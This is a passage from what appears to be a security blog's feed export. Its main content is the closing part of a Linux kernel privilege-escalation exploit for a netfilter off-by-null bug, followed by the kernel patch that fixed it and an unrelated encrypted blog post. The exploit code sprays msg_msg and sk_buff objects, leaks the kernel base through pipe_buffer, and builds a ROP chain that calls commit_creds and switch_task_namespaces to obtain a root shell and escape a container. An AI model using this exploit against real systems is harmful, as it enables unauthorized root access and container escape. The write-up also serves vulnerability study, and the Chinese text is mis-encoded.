SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;</span><br><span class="line">    ops_ptr-&gt;release = <span class="number">0xffffffff8183b4d3</span> + kernel_offset;<span class="comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span></span><br><span class="line">    ops_ptr-&gt;confirm = <span class="number">0xffffffff81689ea4</span> + kernel_offset;<span class="comment">// pop rdx ; pop r13 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    <span class="comment">// switch to namespace init_nsproxy</span></span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = <span class="number">1</span>;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + FIND_TASK_BY_VPID;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + PUSH_RAX_POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RSI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_PROXY;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWITCH_TASK_NAMESPACES;</span><br><span class="line">    <span class="comment">// gain root privilege and return to userspace</span></span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_eflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03.æ¼æ´ä¿®å¤"></a>0x03.æ¼æ´ä¿®å¤</h1><p>å†…æ ¸ä¸»çº¿åœ¨ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b29c457a6511435960115c0f548c4360d5f4801d">è¿™ä¸ª commit</a> ä¸­å®Œæˆäº†å¯¹è¯¥æ¼æ´çš„ä¿®å¤ï¼Œä¸»è¦å°±æ˜¯<strong>å–æ¶ˆæ‰å¯¹ pad ç½® 0 çš„è¿™ä¸€æ“ä½œ</strong>ï¼Œè€Œæ˜¯é€‰æ‹©åœ¨ <code>translate_compat_table()</code> ä¸­è¿›è¡Œé¢„å…ˆçš„ç½® 0ï¼Œä»è€Œé¿å…äº†ä¸ºäº†å°† pad åŒºåŸŸç½® 0 è€Œå¯¼è‡´çš„å †ä¸Š off-by-nullï¼Œç¬”è€…ä¸ªäººè®¤ä¸ºè¿™ä¸ªæ–¹æ¡ˆè¿˜ç®—æ˜¯æ¯”è¾ƒæˆåŠŸçš„</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/net/ipv4/netfilter/arp_tables.c b/net/ipv4/netfilter/arp_tables.c</span></span><br><span class="line"><span class="comment">index 6c26533480dd1..d6d45d820d79a 100644</span></span><br><span class="line"><span class="comment">--- a/net/ipv4/netfilter/arp_tables.c</span></span><br><span class="line"><span class="comment">+++ b/net/ipv4/netfilter/arp_tables.c</span></span><br><span class="line"><span class="meta">@@ -1193,6 +1193,8 @@</span> static int translate_compat_table(struct net *net,</span><br><span class="line"> if (!newinfo)</span><br><span class="line"> goto out_unlock;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+memset(newinfo-&gt;entries, 0, size);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> newinfo-&gt;number = compatr-&gt;num_entries;</span><br><span class="line"> for (i = 0; i &lt; NF_ARP_NUMHOOKS; i++) &#123;</span><br><span class="line"> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];</span><br><span class="line"><span class="comment">diff --git a/net/ipv4/netfilter/ip_tables.c b/net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="comment">index f15bc21d73016..f77ea0dbe6562 100644</span></span><br><span class="line"><span class="comment">--- a/net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="comment">+++ b/net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="meta">@@ -1428,6 +1428,8 @@</span> translate_compat_table(struct net *net,</span><br><span class="line"> if (!newinfo)</span><br><span class="line"> goto out_unlock;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+memset(newinfo-&gt;entries, 0, size);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> newinfo-&gt;number = compatr-&gt;num_entries;</span><br><span class="line"> for (i = 0; i &lt; NF_INET_NUMHOOKS; i++) &#123;</span><br><span class="line"> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];</span><br><span class="line"><span class="comment">diff --git a/net/ipv6/netfilter/ip6_tables.c b/net/ipv6/netfilter/ip6_tables.c</span></span><br><span class="line"><span class="comment">index 2e2119bfcf137..eb2b5404806c6 100644</span></span><br><span class="line"><span class="comment">--- a/net/ipv6/netfilter/ip6_tables.c</span></span><br><span class="line"><span class="comment">+++ b/net/ipv6/netfilter/ip6_tables.c</span></span><br><span class="line"><span class="meta">@@ -1443,6 +1443,8 @@</span> translate_compat_table(struct net *net,</span><br><span class="line"> if (!newinfo)</span><br><span class="line"> goto out_unlock;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+memset(newinfo-&gt;entries, 0, size);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> newinfo-&gt;number = compatr-&gt;num_entries;</span><br><span class="line"> for (i = 0; i &lt; NF_INET_NUMHOOKS; i++) &#123;</span><br><span class="line"> newinfo-&gt;hook_entry[i] = compatr-&gt;hook_entry[i];</span><br><span class="line"><span class="comment">diff --git a/net/netfilter/x_tables.c b/net/netfilter/x_tables.c</span></span><br><span class="line"><span class="comment">index 6bd31a7a27fc5..92e9d4ebc5e8d 100644</span></span><br><span class="line"><span class="comment">--- a/net/netfilter/x_tables.c</span></span><br><span class="line"><span class="comment">+++ b/net/netfilter/x_tables.c</span></span><br><span class="line"><span class="meta">@@ -733,7 +733,7 @@</span> void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,</span><br><span class="line"> &#123;</span><br><span class="line"> const struct xt_match *match = m-&gt;u.kernel.match;</span><br><span class="line"> struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m;</span><br><span class="line"><span class="deletion">-int pad, off = xt_compat_match_offset(match);</span></span><br><span class="line"><span class="addition">+int off = xt_compat_match_offset(match);</span></span><br><span class="line"> u_int16_t msize = cm-&gt;u.user.match_size;</span><br><span class="line"> char name[sizeof(m-&gt;u.user.name)];</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -743,9 +743,6 @@</span> void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,</span><br><span class="line"> match-&gt;compat_from_user(m-&gt;data, cm-&gt;data);</span><br><span class="line"> else</span><br><span class="line"> memcpy(m-&gt;data, cm-&gt;data, msize - sizeof(*cm));</span><br><span class="line"><span class="deletion">-pad = XT_ALIGN(match-&gt;matchsize) - match-&gt;matchsize;</span></span><br><span class="line"><span class="deletion">-if (pad &gt; 0)</span></span><br><span class="line"><span class="deletion">-memset(m-&gt;data + match-&gt;matchsize, 0, pad);</span></span><br><span class="line"> </span><br><span class="line"> msize += off;</span><br><span class="line"> m-&gt;u.user.match_size = msize;</span><br><span class="line"><span class="meta">@@ -1116,7 +1113,7 @@</span> void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,</span><br><span class="line"> &#123;</span><br><span class="line"> const struct xt_target *target = t-&gt;u.kernel.target;</span><br><span class="line"> struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;</span><br><span class="line"><span class="deletion">-int pad, off = xt_compat_target_offset(target);</span></span><br><span class="line"><span class="addition">+int off = xt_compat_target_offset(target);</span></span><br><span class="line"> u_int16_t tsize = ct-&gt;u.user.target_size;</span><br><span class="line"> char name[sizeof(t-&gt;u.user.name)];</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -1126,9 +1123,6 @@</span> void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,</span><br><span class="line"> target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);</span><br><span class="line"> else</span><br><span class="line"> memcpy(t-&gt;data, ct-&gt;data, tsize - sizeof(*ct));</span><br><span class="line"><span class="deletion">-pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span></span><br><span class="line"><span class="deletion">-if (pad &gt; 0)</span></span><br><span class="line"><span class="deletion">-memset(t-&gt;data + target-&gt;targetsize, 0, pad);</span></span><br><span class="line"> </span><br><span class="line"> tsize += off;</span><br><span class="line"> t-&gt;u.user.target_size = tsize;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;del&gt;å–·å­æ°¸è¿œæ˜¯ç‰ˆæœ¬ç­”æ¡ˆ&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="ææƒ" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="å®¹å™¨é€ƒé€¸" scheme="http://blog.arttnba3.cn/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>ã€PIECES.0x03ã€‘Shellä¹‹å¤–çš„å¾€äº‹ï¼šä¸€æ¡¶å‡‰æ³¡é¢</title>
    <link href="http://blog.arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/"/>
    <id>http://blog.arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/</id>
    <published>2022-03-17T20:14:40.000Z</published>
    <updated>2022-07-03T18:28:21.164Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="é“¾æ¥ï¼šhttps://pan.baidu.com/s/1glFilTF8ua6hI-bklKgJXw æå–ç ï¼šcth0" data-whm="è¿˜è¯·ä¸è¦åšä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„äº‹æƒ…ï¼">  <script id="hbeData" type="hbeData" data-hmacdigest="021a53f82f4d0a53a326dbabae58ecbff5caf1dcda21cbc8c2c71e6d35e1c32e">eef143a3a3e51e2ee0b1e9c84de8c53cc91e34a664716adcbae4109613b0f512e4f2191695bdd8ebd253d7aea5fb72fb7441e7a0c717919bf2d685be72be9f75bb229fefdf00a1d50c05f54dbeda18476fada873faa1e8f0c1d3c2642d134e0a72e5a53d997a9032eb55059b45dfb74dba53660fe60ac68b74c2aa55b7ce3c50484d8455ea294d03d5755991cdb4132a5dba9f709d6c439731c890785e495760e97a0f5cf91d9be2870847bab8af5cb042d628a9bee60fd37d9055e0371856feda62e72612729a1820936cc6d2dcbc15197de145db589df683e7ffa92c6120c0edea38d3f6e6b1a11027580f0c233d8217ad1bd07bad12bf0291bde16123b044a5839d34cc384be04d0442fc9f602ace513f3660bc7b28958fbcdc347b83b8e4bcaa472b64eb5b98ac96d15e8f7b0cf6cac705978ae2070a788c06981ad3d2cb860e7dbdef2dcf704a72f141487a58dda00bcc72c7a6070184cb2bfcda276baf56b941d38a3db0a30e54774de12be79d2c7ed1e46ef7bd2c9c2b80af1ccda49baa66c85eef85487154785cde4d4fb3d2b1ee3999c1641722ef19c07541e5e7097c69ca99998d796c5151e63f7d9b8ab5c66946f9301c754cdea3bfab6f94d20b24d5f57010e3003202b51891df9580119ffaed608e0a5cc56621ef8802e884efacd595e4eb5a06b9ffd6cb48fae2cdefd4054a6b829d198e38aa159080ba75783a9e806024d54994b6bd3a5b7536d4b9408dda28a4b75420fba0e4521945e538cabb9a6f7229eeacf32334e1265a849464609d4af9ed4cd748dbb7fa72111d0a056b3bea351dc4544f7f7937a169c8a8d13c1f2664b4d0c084ee77a7c26f37569eea4e226bff7a5daea2f9acdab3efb03c252f539b8ac6820d6ee5f23fcac3544a2b58dbaec0e91e6bbe7054db5a2b473ed4ce14441e0a79c3cc17f6475bd9d1bced6235f4b9983a0f8dc7bca224cad782444363302a9687697c6a1cb298993bf3709988f72cad5417d18879304479c3e3f710e41255a1b3855bac6b5a74451d7189f9ebe8592674b8b631c9a066168999e820a47d8ec45d6c428c7917ce272c67e84d4e880f45255c924f1ec19ae023b9fbe7e51e3f0c0d70a9b19ede74e7e46223f2cb50a47bdee12e6ca2c4036fb67b141a3511adcc785592f6ace64aedd34a126a52364d6c770ba2ea14ac07c3e68b2b45bd77df2de268eee62ae1d29e79d8e9798ebda99c4c70326da1bf430f8ef813851a6fb9c753712160c097e513980eafab10c3e63fc2a748286956ce3f271f2d9f64a02c7edddd34241a92a41810794e8a28ba3be385c9e9a54562e6e22193ad53381ba1512d3c35e3bb5e38ebe89e7c35d65e86209a224b453eb22c4208c6fae5051ec32d5a3331be3163d21fe1c6d787c05316ebffaa5a6bdaf1278aaebceb0dbdcddc85d259386b553c93491dba7bfd182cedaed31b7d3c7b38f104cd2097ea63970d0580e5abe327a6efe0fa40539856c5974ac182f944c7df952e4204cfe1076f46af9d18da06aa8e3be966c4f69e10c12a3eec3935f7301de0708f0bdab19011b138f023cd6b14196a937d583c5b520b8e08c69c6a1dd58188b08250df5f2f21b97828a497ba4085a3d4dbd05266938b4bbcbd4895c8bf335400b757eccbdfc0be8213effcb68a5df107414da1aae7c0c3a2ea93e09fa4414a2d4ca04a51eacf849aa4484d999e43c1e4c7bfa6e8479dca6a6c9cd2a2fd0cb85eb8402a58267b6fae056c4bdf112fd8b80a2db2f647c68237bee2cdd98ddac77f5a49316ed172cd8a6b49214c3bdcf48cace48f43bd5fe68615b5788ca4fcb866596ae601b683ccf17308896bfae3b03623614a7abe3542cd2a381eec948ee60a7d60c673444f7fde3615429376fcb9e7ba9bfad601e8938b74fabe1d1f7769cd9d09f2b92ecb2b2dedb1c65c4a116f231127b295096143fb4c5cba421fb3169720c5a93209e2018366e37b2ef2299af60577e118430cb0aebc1fcebd53ffbc8603e6570c2d74f1fbefbedba21514f1e85910b9087ab0730aab56fd3344b499505fbfde4ca1a58917a92fb687f5f5bb89a3717ceaae2b91bef950e813a219ce23a1b099d55f4d534ca93df6799cba47036f1a2cea6368a095f8152e9832cf97edd6be7392242f044f5aed2a062ece3a87fa48cdae902c0ad3d7395f2bc6998f34616ac6b221c249f38c172380df1c994b08b6e7be4b4b67aafe3e5085e7e13ad3ca9e60761f4b624ce19168dba2fbd0606b04638004044e38a239a1dcf31346230256f2e69d067c25cd0bfe69d3ee95fa8e07a0eec24394b030b8b1cb1affd424a0e217b3a58fc667c33ced6d476fe18cb397d0716af7e316f63e0091aa0f3b61e5c51f7361b3ae312f5b5b4b4e98f42726454a5f3e0f344c7c86f0e96ab2ef2eb9d2047f29581c1aeba2ad3a8f0c6a1b5cc46b4a3132ac48bb2856c441930e14c642cb424262fb0e0217d43950adeafae0983fdd6901599593fbfc0144dbf51ee22d25570c58070273dc1a44daffce60ddb0105f476d2c7ad19e7926b5d55426e57f680a176ca359856e44a0434c02eb53a6506bf3ea8fb34f56cc44b58204c86363175da82b4af652b27c38d42c62d8d91a4076056fbd41811217599b60d0891286be3dc4d35d8c4490a07caaf348c70a10f96d32f5a1d5430bce1c4f9b27098260d62e1170c4235ccf85b44d0953785033722979baad48f267243f924f5b3fe137700cfe7edb97f87875ad00d1ac40e0d22dd776176e6179ef55f807c6910a05ecaab85e62fd39447732d8ef6716168f521149c7155a642b2d70ebd0425c7aa75259f735b4b3a066fbaa360b72b3dfdeef0f90ffacd6a7a73bffd8e09ad591c4351d0fe690090175c20d1678a270c0e836ec795d8e8be48def1ece83606d1d4091f24582f55b171335bcba7472d0f965ce0a2a9ff355cec243b918d08199519de26ada6747ab0f3e7114937b6d85219da1db83d4baf3b20843214360a4aa4e4ae6fbbd870af67383f4b3cf43438005f9cf2aad2d58a02513df3a1e26f073165ced0ea9d21b446659833b4a13713f903c40e78aaf712c8b0d5a7393cc48c61d1cfc995cbdab3b2221d6fbdf66d9e240b0714ec8ed47334bacaeafe75c9371c613b36355ab54e7677f6f60c57111ae371942a407640ed9059e15490cae1471e6ae61feaaf5725c17cbf9cb6b6797a2fe58de81af37936d395383927aa3421c2b11480f7518fe52e9d917e820d3075bd0c890577e0a94813a61fc58aad4954dc4e455be7d8d174d9ddfe1670f8eaffef937ff44083bf4ce896caf1299aabc3358f49a994970b6ae2709feed2bfee682e62592334c06b8bdee852d0fa0e3855d4c0a0b3bbf03ff7b0b79ca63be326051ca0e85297b279447ae51e9781696c5c8b3968c0a5a392dd11f97f5a40cea9016dab58534d848e02e7cc5dd4ca13708345d8fb2b192d149e4b1978cda66f1d13c71136b2aefff0ca7f6f1a9bb3bd8a974c39b8f46b1399688c4964fc293afea1f6dd8aa9fffca897b540b956e2e7b4c7780bd280f1cb075e0997667a7bf6ee0b789c1beaa21df05b2762292a266f5787655d4d6e81cf39ec9175d9805ef2f18f638318ba2f38513d9773edbdbe46da05905a6cd1618e9cfd86d0261434b86549fb32e85a5b0bc3ac7b5bebfa3814f26e50dd1c324f4d586982ef399f698b191980c2847c865b2a99373d845e13ec26ba637469d5c8bb2dc46ec70d798bc6239d61378c26e70e6a559559b61e738d05aafdaf608ee3c4322a1627bad8cffd694ea426a752e20e18ad068e7d0fbfe5cb33b345059c8cf2544ff00f6c679feb77ed0bef4fa1109760e47cd2d0fbe21f3c5240e91a0b1ebb5f60c83549187c5d6ed491aef4dae010d5c5ab5db5480a68896ecce1582e5f401fd1bd425f8056bb2d603fae40064a9c2df1117683da722b2ac0fab4caf97f0ac6eda5c87ebfb69b29c5b7a53ffa255b4206dcefa6f035e25cfcff6d3109d7c936b1c99ddfbfff84d6efcb9022775af383791325a72bdf3c19a4766dcc47ba559cb0ea5aa89f21fe70b3ab1074b5c66e7f7fe7077800c1e8a41d6913f615e3fc0f56b1fd44b7a4ee3f92bc1b41e598507e2c7e2b74763809c3edc892f492346bdc8844dc96191f5a57ecf5c9bf6a0a61cb623a6f827414951d349334d9c3073c95274923563ec80117331e711ebdb97716404b88fb478041aedee0354aed9bcc1572a4d8b9236d0dd7b2ccea3a3e596f8daa496ed850a15d6e9641139fd0a75bfe66fe0a4f39a956a5f324ea820613b3969bc78f60ca15fb066f0589e6f12dfdaebab61aef2f22e8b086f148c504fd3676b6b6b5e8ba81088c044cf93fc21cc16fd19518b64e0787098f93e7cb7ffe1b580563a1b34e280787406b12569149a2f198808ee0d6483ac14031376783e409a192228a6620820742d4c1bd14823fd589eb4fa22b686c0d61efb3685d5488c5a6cefbdde112ad8d0325f1dd00dc3ff5b78fba9f251e7ecd1850813e0a68e14616220042d7fde8aa714034406fe542856f49d53c274cefd7f4637239a339ad9272a31ed93d094b227bc1eeccfee46b270aa61a7968c5b20f80832b2b8f49e6556dc5085ddc14cfc51175dd42314c0d659b81efcab91f1ae0112706f95737eb5d99815e53c920a5e9c8416a1e45d5b24727df42844996f87ebfd4bd2ba719b46fb36e0704454ebf8938f5079e1375b96dc61fca34e7827f53b5a22e5cef2a6203542cfcddfad2dd72e6575512206f53ed434e1171e3ef675bca25e579804ee94468cc0dfa893cbfd767ae872998c3273d296078617f9c27023796f9b9f62bf71ca2b79b004bcf920559ff957b5200a8fb0d2160b1102a5ba3773189959cced97cd94a1e6e6076bf6079c6f9613ba6509095758e82e7d3eba976a41fa4f5d02730d93631f54a88b1a01316dbc69fcc14ca9332418afcea33ad91934a0188cc8eb89749721ef2ab7c2919a80016418c4b753324fe762a6ba7fb18487a5246dc1900737de4cdcd2660eed2c69f313f43e338667eb3a90a087c3698312466aa339596210e75a149a6f92d26501b2071f7e13c88eb1cd0eaac84bd8a44bec27580cde0512cd9ea0119e046d7a25766dff02eb235fd026813b3488430b19baaa747f85e641fedeef54f49415ea9d82c556d26f7ea345fb610d2efe45b5659119a0c9f9e96e2341ccba9c235b1e6de1b074c0b64c9fc6fb5e0d7e72f5dcd187c15002b03e87694e05bd4a5d739c6c5655491a86bb8c7c3ed5b632220589db51d7a4f1ac8c68600a6f99b60dbbb8aa1a2d97bdef479717895f62f3ac28499c5aea3e41c10ce3fe66b5e23020c69d406a7d4ac5ccc66878484f2446dabb3a54e98530dfa1940ec242be18d276e3b04ef540d2343379adeaab00aa81e6a72e7470911026d4b30382e946f729d2c2ae5b45870395d100b8bdd86ff681796569604f6dff38922f5c014b2f4d2c442218dd5ced5200fb8709339c8c49795cd8ba08fc5eebab5685a5636d524c5428b7bd8e2f5bf3e9a246d89095400d46745af6dbc9243ce599bd32200d713da69293d044b46941afd463c8a78396653fab112b4ff82d450148ee74b06e27c4aadf533a54c935618dcc3aae5ef41c84a5a82b648315f118bcfe0840b1df70d82c6b033d8f3d8f0ec8ef41fb60974393c7b3ed57feb9607a3439f99b3f0c0739ab4b28ce77a1b415f601cfe41c85fc3ac8fe997e8dd0acf54596dc62929bc61beb310a5d0c930010a8e2c88c5385b17a0f0ed68c4403d4262c860c590caf539d606d72e19f5f74904c15c4a551fbe205767c8fee753e0cc05bfe64dc6c0aaf6ba2d20f99307ad81009b0b35f63f729045b434266e4154fd